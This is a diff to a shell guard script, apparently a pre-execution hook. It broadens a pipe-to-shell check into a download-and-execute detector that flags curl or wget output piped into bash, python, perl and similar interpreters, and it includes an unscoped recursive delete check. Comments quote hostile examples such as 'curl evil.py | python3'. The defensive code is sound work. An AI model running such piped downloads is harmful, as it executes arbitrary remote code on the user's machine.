@@ -25,10 +25,24 @@ strip_rtk_prefix() {
     printf '%s' "$1" | sed -E 's/^[[:space:]]*rtk[[:space:]]+(proxy[[:space:]]+)?//'
 }
 
-# 1. Pipe-to-shell — the leak an allowlist cannot express.
-#    Matches: curl … | bash, wget … | sh, … | sudo bash, … |zsh
-is_pipe_to_shell() {
+# 1. Download-and-execute — the leak an allowlist cannot express.
+#    The threat is *arbitrary network content* fed into an interpreter, so BOTH halves must hold:
+#      (a) a network fetcher (curl/wget) is the pipeline's data source, AND
+#      (b) that pipe reaches an interpreter (shell OR python/perl/… — `curl evil.py | python3`
+#          is RCE too).
+#    Match effect, not text shape (dotfiles-dev#80): `gh --json … | python3 -c` and
+#    `cat local.sh | bash` are authenticated/local producers, not downloads, so they pass. We keep
+#    the interpreter set broad because it only bites when (a) already holds — a genuine download.
+is_network_fetch() {
+    printf '%s' "$1" | grep -Eq '(^|[;&|][[:space:]]*)(curl|wget)([[:space:]]|$)'
+}
+
+is_pipe_to_interpreter() {
     printf '%s' "$1" | grep -Eq '\|[[:space:]]*(sudo[[:space:]]+)?(bash|sh|zsh|python3?|perl|ruby|node)([[:space:]]|$)'
+}
+
+is_download_and_execute() {
+    is_network_fetch "$1" && is_pipe_to_interpreter "$1"
 }
 
 # 2. Unscoped recursive delete — target is /, ~, $HOME, or a root-level glob.
@@ -88,7 +102,7 @@ main() {
 
     cmd="$(strip_rtk_prefix "$command")"
 
-    if is_pipe_to_shell "$cmd"; then
+    if is_download_and_execute "$cmd"; then
         block "piping downloaded content into a shell interpreter." \
               "Download to a file, read it, then run it — never 'curl … | bash'."
     fi
